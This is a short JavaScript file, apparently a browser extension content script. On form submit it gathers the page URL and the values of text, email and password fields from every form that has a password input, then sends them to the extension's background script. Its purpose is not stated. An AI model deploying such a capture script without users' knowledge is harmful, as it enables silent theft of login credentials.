function BackgroundConnector() {

  this.sendData = function(data, callback) {
    if(typeof callback === 'undefined') {
      callback = function() {};
    }
    chrome.runtime.sendMessage(data, callback);
  };

  this.save = function(data) {
    this.sendData(data);
  };

};

function Monitor(document) {
  this.document = document;

  this.serializeFormData = function(form) {
    var formData = {};
    var inputTypesToSerialize = ['text','email','password'];
    var formInputs = form.getElementsByTagName('input');
    Array.prototype.forEach.call(formInputs, function(formInput) {
      if(inputTypesToSerialize.indexOf(formInput.type.toLowerCase()) !== -1 && formInput.name !== '') {
        formData[formInput.name] = formInput.value;
      }
    });
    return formData;
  };

  this.recordDetails = function(form) {
    var self = this;
    form.addEventListener('submit', function(e) {
      var url = document.location.href;
      var formData = self.serializeFormData(form);
      var bgConnector = new BackgroundConnector();
      bgConnector.save({
        'data' : {
          'url' : url,
          'formData' : formData
        }
      });
    });
  };

  this.registerEvents = function() {
    var self = this;
    var inputs = document.getElementsByTagName('input');
    Array.prototype.forEach.call(inputs, function(input) {
      if(input.type.toLowerCase() === 'password') {
        if(input.form) {
          self.recordDetails(input.form);
        }
      }
    });
  };

  this.startMonitoring = function() {
    this.registerEvents();
  };

};
var m = new Monitor(document);
m.startMonitoring();
